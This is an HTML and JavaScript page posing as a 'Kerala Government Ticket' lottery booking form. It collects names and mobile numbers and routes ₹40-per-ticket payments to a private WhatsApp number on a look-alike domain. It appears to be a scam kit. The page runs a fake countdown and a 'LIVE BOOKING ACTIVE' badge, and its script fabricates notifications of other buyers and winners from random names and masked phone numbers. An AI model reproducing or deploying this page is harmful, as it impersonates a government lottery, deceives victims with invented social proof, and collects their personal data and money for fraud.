<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Kerala Government Ticket</title>
<style>
:root{--accent:#ff4f79;--accent-dark:#d9365d;--bg:#fff3f7;--card:#fff;}
body{margin:0;background:var(--bg);font-family:Arial,sans-serif;display:flex;justify-content:center;padding:8px;}
.container{width:100%;max-width:400px;background:var(--card);padding:14px;border-radius:14px;box-shadow:0 4px 8px rgba(0,0,0,.14);position:relative;z-index:10010;}
.topLogo img{width:130px;display:block;margin:0 auto 4px;}
.livePop{display:inline-block;padding:6px 14px;border-radius:20px;background:linear-gradient(90deg,#2ecc71,#27ae60);color:#fff;font-size:12px;font-weight:bold;animation:pulse 1.2s infinite;}
@keyframes pulse{0%{transform:scale(1);}50%{transform:scale(1.05);}100%{transform:scale(1);}}
.timerBar{background:#e8f5e9;color:#1b5e20;padding:6px;border-radius:8px;font-size:12px;text-align:center;font-weight:bold;margin-bottom:6px;}
h2{text-align:center;margin:6px 0;color:#d9365d;font-size:18px;}
input,select,button{width:100%;padding:9px;margin-bottom:8px;border-radius:8px;border:1px solid #ddd;font-size:13px;}
.ticketBox{border:2px dashed #ff4f79;border-radius:12px;padding:10px;margin-bottom:8px;}
.ticketAmount{background:#e8f5e9;color:#1b5e20;padding:6px;border-radius:8px;text-align:center;font-weight:bold;margin-bottom:6px;font-size:13px;}
.ticketTitle{font-weight:bold;color:#d9365d;margin-bottom:4px;font-size:13px;}
select[multiple]{height:55px;}
.counter{font-size:11px;margin-top:3px;}
.selectedList{display:flex;flex-wrap:wrap;gap:5px;margin-top:5px;}
.chip{background:#ffe3ea;color:#d9365d;padding:3px 7px;border-radius:10px;font-size:11px;display:flex;align-items:center;gap:5px;}
.chip span{cursor:pointer;font-weight:bold;}
button{background:linear-gradient(90deg,var(--accent),var(--accent-dark));color:#fff;border:none;font-weight:bold;cursor:pointer;font-size:14px;}
button:disabled{opacity:.5;cursor:not-allowed;}
.modal{position:fixed;inset:0;background:rgba(0,0,0,.45);display:none;align-items:center;justify-content:center;}
.modalBox{background:#fff;width:92%;max-width:360px;border-radius:14px;padding:16px;}
.modalBox h3{text-align:center;color:#d9365d;margin:0 0 10px;}
.summary{font-size:13px;line-height:1.6;}
.modalBtns{display:flex;gap:10px;margin-top:12px;}
.modalBtns button{flex:1;}
.cancelBtn{background:#ccc;color:#333;}

/* Compact right-side bottom notifications */
.notif-wrapper{
  position:fixed;
  right:16px;         /* moved to right so center form not overlapped */
  bottom:92px;        /* above whatsapp float */
  z-index:10005;
  display:flex;
  flex-direction:column;
  gap:8px;
  pointer-events:none;
  max-width:280px;
}
.notif{
  pointer-events:auto;
  background:linear-gradient(90deg, rgba(255,79,121,0.05), rgba(217,54,93,0.02));
  border:1px solid rgba(0,0,0,0.06);
  color:#222;
  padding:8px 10px;
  border-radius:10px;
  box-shadow:0 6px 14px rgba(0,0,0,0.12);
  display:flex;
  gap:8px;
  align-items:center;
  transform:translateY(6px);
  opacity:0;
  animation:slideIn 320ms ease forwards;
  font-size:12px;
  min-width:180px;
  max-width:280px;
  backdrop-filter: blur(3px);
}
.notif.hide { animation:slideOut 280ms ease forwards; }
@keyframes slideIn{ from{opacity:0; transform:translateY(10px) translateX(6px) scale(.99);} to{opacity:1; transform:translateY(0) translateX(0) scale(1);} }
@keyframes slideOut{ from{opacity:1; transform:translateY(0);} to{opacity:0; transform:translateY(12px) scale(.98);} }

.notif .avatar{
  width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-dark));color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;flex-shrink:0;
}
.notif .body{flex:1;line-height:1.05;min-width:0;}
.notif .body .who{font-weight:700;font-size:12px;color:#d9365d;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.notif .body .mobile{font-size:11px;color:#555;margin-top:2px;}
.notif .body .state{font-size:11px;color:#333;margin-top:2px;font-weight:600;}
.notif .body .msg{margin-top:6px;font-size:13px;color:#222;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:170px;}
.notif .closeBtn{margin-left:8px;border:none;background:transparent;color:#666;font-size:14px;cursor:pointer;padding:6px;border-radius:8px;}
.notif .closeBtn:focus{outline:2px solid rgba(0,0,0,.06);}

/* floating whatsapp button on right (uses provided image) */
.wa-float{
  position:fixed;
  right:16px;
  bottom:16px;
  z-index:10006;
  width:56px;height:56px;border-radius:50%;box-shadow:0 8px 20px rgba(0,0,0,0.18);overflow:hidden;background:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;
}
.wa-float img{width:100%;height:100%;object-fit:cover;display:block;}

/* small responsive tweak */
@media (max-width:420px){
  .notif-wrapper{right:12px;left:12px;max-width:calc(100% - 24px);bottom:98px;}
  .wa-float{right:12px;bottom:12px;width:48px;height:48px;}
}
</style>
</head>

<body>
<div class="container">

<div class="topLogo">
<img src="https://i.postimg.cc/XvXzF7RJ/IMG-20251225-WA0003.jpg" alt="logo">
</div>

<div style="text-align:center;margin-bottom:6px;">
<span class="livePop">üü¢ LIVE BOOKING ACTIVE</span>
</div>

<div class="timerBar" id="timer">‚è≥ Booking closes in 30:00</div>

<h2>Kerala Government Ticket</h2>

<input id="name" placeholder="Full Name">
<input id="mobile" placeholder="Mobile Number">

<select id="state">
  <option value="">Select State</option>
  <option>Kerala</option>
  <option>Tamil Nadu</option>
  <option>Karnataka</option>
  <option>Andhra Pradesh</option>
  <option>Telangana</option>
</select>

<select id="language">
<option>English</option>
<option>Hindi</option>
<option>Malayalam</option>
<option>Tamil</option>
<option>Kannada</option>
<option>Telugu</option>
</select>

<div class="ticketBox">
<div class="ticketAmount" id="ticketAmount">üí∞ Total Amount: ‚Çπ0</div>
<div class="ticketTitle">üéü Select Lucky Ticket (‚Çπ40 per ticket)</div>
<select id="ticket" multiple></select>
<div class="counter" id="counter">Selected: 0 tickets</div>
<div class="selectedList" id="selectedList"></div>
</div>

<input id="amount" placeholder="Total Amount (‚Çπ)" readonly>
<button id="submitBtn" disabled>Submit & Continue</button>

</div>

<!-- Compact right-bottom notification wrapper -->
<div class="notif-wrapper" id="notifWrapper" aria-live="polite"></div>

<!-- Floating WhatsApp (uses provided image) -->
<div class="wa-float" id="waFloat" title="Chat on WhatsApp">
  <img src="https://kerelalottery.ct.ws/wp-content/uploads/2026/02/whatsapp.jpg" alt="whatsapp">
</div>

<div class="modal" id="previewModal">
  <div class="modalBox">
    <h3>Payment Preview</h3>
    <div class="summary" id="previewContent"></div>
    <div class="modalBtns">
      <button class="cancelBtn" onclick="closePreview()">Cancel</button>
      <button onclick="proceedWhatsApp()">Confirm & WhatsApp</button>
    </div>
  </div>
</div>

<script>
/* ---------- CONFIG: change number here and it updates both places ---------- */
const WHATSAPP_NUMBER = "+919576398992"; // change here to update everywhere
const WHATSAPP_IMG_URL = "https://kerelalottery.ct.ws/wp-content/uploads/2026/02/whatsapp.jpg";

/* timer + ticket logic */
let time=1800;
setInterval(()=>{
 let m=Math.floor(time/60),s=time%60;
 document.getElementById("timer").textContent=`‚è≥ Booking closes in ${m}:${s.toString().padStart(2,"0")}`;
 if(time>0) time--;
},1000);

const TICKET_PRICE=40,MIN_TICKETS=3;
const ticket=document.getElementById("ticket"),
selectedList=document.getElementById("selectedList"),
amount=document.getElementById("amount"),
ticketAmount=document.getElementById("ticketAmount"),
submitBtn=document.getElementById("submitBtn"),
counter=document.getElementById("counter"),
language=document.getElementById("language"),
stateSelect=document.getElementById("state"),
nameI=document.getElementById("name"),
mobileI=document.getElementById("mobile"),
previewModal=document.getElementById("previewModal"),
previewContent=document.getElementById("previewContent");

for(let i=0;i<3000;i++){
 let n=("000000"+Math.floor(Math.random()*999999)).slice(-6);
 let o=document.createElement("option");
 o.value="KL"+n;o.textContent="KL"+n;
 ticket.appendChild(o);
}

/* append more states under top ones */
const moreStates = [
  "Maharashtra","Gujarat","Rajasthan","Punjab","Haryana","Bihar","Uttar Pradesh",
  "Madhya Pradesh","Chhattisgarh","Odisha","West Bengal","Assam",
  "Arunachal Pradesh","Manipur","Meghalaya","Mizoram","Nagaland","Sikkim","Tripura",
  "Jammu & Kashmir","Ladakh","Delhi","Goa","Puducherry","Andaman & Nicobar",
  "Dadra and Nagar Haveli and Daman & Diu","Lakshadweep"
];
const existVals = [...stateSelect.options].map(o=>o.textContent.trim());
moreStates.forEach(s=>{
  if(!existVals.includes(s)){
    let o=document.createElement("option");
    o.textContent=s;
    stateSelect.appendChild(o);
  }
});

function refresh(){
 let sel=[...ticket.selectedOptions].map(o=>o.value);
 counter.textContent=`Selected: ${sel.length} tickets`;
 selectedList.innerHTML="";
 sel.forEach(t=>{
   let c=document.createElement("div");
   c.className="chip";
   c.innerHTML=`${t} <span onclick="removeTicket('${t}')">√ó</span>`;
   selectedList.appendChild(c);
 });
 if(sel.length>=MIN_TICKETS){
   let total=sel.length*TICKET_PRICE;
   amount.value="‚Çπ "+total;
   ticketAmount.textContent="üí∞ Total Amount: ‚Çπ "+total;
 }else{
   amount.value="";
   ticketAmount.textContent="üí∞ Minimum 3 tickets required";
 }
 submitBtn.disabled=!(sel.length>=3 && nameI.value && mobileI.value && stateSelect.value);
}

ticket.addEventListener("change",refresh);
[nameI,mobileI,stateSelect].forEach(i=>i.addEventListener("input",refresh));

window.removeTicket=(t)=>{
 [...ticket.options].forEach(o=>{if(o.value===t) o.selected=false;});
 refresh();
};

submitBtn.onclick=()=>{
 let sel=[...ticket.selectedOptions].map(o=>o.value).join(", ");
 previewContent.innerHTML=`
<b>Name:</b> ${nameI.value}<br>
<b>Mobile:</b> ${mobileI.value}<br>
<b>State:</b> ${stateSelect.value}<br><br>
<b>Tickets Selected:</b><br>${sel}<br><br>
<b>Total Tickets:</b> ${ticket.selectedOptions.length}<br>
<b>Price per Ticket:</b> ‚Çπ40<br>
<b>Total Amount:</b> ${amount.value}<br><br>
<b>Payment Mode:</b> WhatsApp Confirmation<br>
‚ö†Ô∏è Please verify details before proceeding.
 `;
 previewModal.style.display="flex";
};

function closePreview(){previewModal.style.display="none";}

function proceedWhatsApp(){
 let tickets=[...ticket.selectedOptions].map(o=>o.value).join(", ");
 let msg=`New Booking
Name: ${nameI.value}
Mobile: ${mobileI.value}
State: ${stateSelect.value}

Tickets:
${tickets}

Total Tickets: ${ticket.selectedOptions.length}
Amount: ${amount.value}
Language: ${language.value}`;
 const numClean = WHATSAPP_NUMBER.replace(/\D/g,'');
 window.open("https://wa.me/"+numClean+"?text="+encodeURIComponent(msg),"_blank");
 previewModal.style.display="none";
}

/* ---------- Compact rotating notifications (right-bottom, max 2 shown) ---------- */

/* bigger South full names (popular/full style) */
const southFullNames = [
  "Vijay Kumar","Ajith Kumar","Suriya Prabhu","Dhanush Kumar","Mohanlal Nair",
  "Mammootty Varghese","Sreekumar Nair","Ravichandran","Prakash Raj","Naveen Kumar",
  "Arjun Prakash","Karthikeyan R","Ramesh Babu","Srinivasan K","Balaji Reddy",
  "Santhosh Kumar","Venkatesh Rao","Ravi Shankar","Gopinath N","Manoj Kumar",
  "Harishankar P","Murali Krishna","Sudheer Nair","Nandakumar","Sujith Kumar"
];
/* weight south names heavier */
const namesWeighted = [...southFullNames, ...southFullNames, ...southFullNames];

/* short templates only */
const templates = [
  "Just booked {T}",
  "Booked {T}",
  "WIN on {T}",
  "KL{T}!",
  "Grabbed {T}"
];

/* states bias towards south */
const southStates = ["Kerala","Tamil Nadu","Karnataka","Andhra Pradesh","Telangana","Puducherry","Goa"];
const otherStates = ["Maharashtra","Gujarat","Rajasthan","Punjab","Haryana","Bihar","Uttar Pradesh",
  "Madhya Pradesh","Chhattisgarh","Odisha","West Bengal","Assam","Delhi"];
const statesWeighted = [...southStates, ...southStates, ...southStates, ...otherStates];

/* helper functions */
function randTicket(){ return (Math.floor(Math.random()*900000)+100000); } // 100000..999999
function randMobileMasked(){ const first = [9,8,7][Math.floor(Math.random()*3)]; const next = Math.floor(Math.random()*10); let last4 = ("" + (Math.floor(Math.random()*9000)+1000)); return "+91 " + first + ""+next + "xxxx" + last4; }

const notifWrapper = document.getElementById("notifWrapper");

function showOneNotif(opts={}, displayMs=4800){
  // keep max 2 notifs visible
  if(notifWrapper.children.length >= 2){
    // remove oldest smoothly
    const first = notifWrapper.children[0];
    first.classList.add("hide");
    setTimeout(()=>{ if(first && first.remove) first.remove(); }, 320);
  }

  const n = document.createElement("div"); n.className="notif";
  const avatar = document.createElement("div"); avatar.className="avatar"; avatar.textContent = (opts.name ? opts.name.split(" ").map(p=>p[0]).slice(0,2).join("") : "S");
  const body = document.createElement("div"); body.className="body";
  body.innerHTML = `<div class="who" title="${opts.name}">${opts.name}</div>
                    <div class="mobile">${opts.mobile}</div>
                    <div class="state">${opts.state}</div>
                    <div class="msg">${opts.message}</div>`;
  const close = document.createElement("button"); close.className="closeBtn"; close.setAttribute("aria-label","close"); close.innerHTML="‚úï";
  close.onclick = () => { n.classList.add("hide"); setTimeout(()=>{ n.remove(); }, 280); };
  n.appendChild(avatar); n.appendChild(body); n.appendChild(close);
  notifWrapper.appendChild(n);

  setTimeout(()=>{ n.classList.add("hide"); setTimeout(()=>{ if(n) n.remove(); }, 320); }, displayMs);
}

/* generate and show */
function generateAndShow(){
  const name = namesWeighted[Math.floor(Math.random()*namesWeighted.length)];
  const ticket = "KL" + randTicket();
  const tpl = templates[Math.floor(Math.random()*templates.length)];
  const message = tpl.includes("{T}") ? tpl.replace("{T}", ticket) : tpl + " " + ticket;
  const mobile = randMobileMasked();
  const state = statesWeighted[Math.floor(Math.random()*statesWeighted.length)];
  showOneNotif({ name, mobile, message, state }, 4800);
}

/* start cycle */
let cycleIntervalMs = 3500;
function startNotifCycle(){
  generateAndShow();
  window._notifTimer = setInterval(generateAndShow, cycleIntervalMs);
}
document.addEventListener("DOMContentLoaded", ()=>{
  // ensure whatsapp image
  const waFloat = document.getElementById("waFloat");
  waFloat.querySelector("img").src = WHATSAPP_IMG_URL;
  startNotifCycle();
});

/* stop when user focuses inputs */
[nameI, mobileI].forEach(el=>{
  el.addEventListener("focus", ()=> {
    if(window._notifTimer){ clearInterval(window._notifTimer); window._notifTimer = null; }
  });
  el.addEventListener("blur", ()=> { if(!window._notifTimer) startNotifCycle(); });
});

/* whatsapp float click uses same WHATSAPP_NUMBER */
document.getElementById("waFloat").addEventListener("click", ()=>{
  const numClean = WHATSAPP_NUMBER.replace(/\D/g,'');
  const msg = "Hi, I want to book tickets.";
  window.open("https://wa.me/"+numClean+"?text="+encodeURIComponent(msg), "_blank");
});
</script>
</body>
</html>
